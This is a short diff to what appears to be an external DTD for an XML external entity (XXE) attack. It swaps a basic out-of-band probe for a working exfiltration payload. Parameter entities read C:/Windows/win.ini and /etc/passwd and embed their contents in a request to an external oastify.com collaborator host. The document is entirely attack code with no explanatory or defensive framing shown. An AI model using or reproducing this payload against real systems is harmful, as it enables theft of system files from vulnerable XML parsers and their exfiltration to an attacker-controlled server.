@@ -1,2 +1,5 @@
-<!ENTITY % test SYSTEM "http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com/basic-test">
-%test;
+<!ENTITY % win SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % lin SYSTEM "file:///etc/passwd">
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com/?win=%win;&lin=%lin;'>">
+%payload;
+%send;
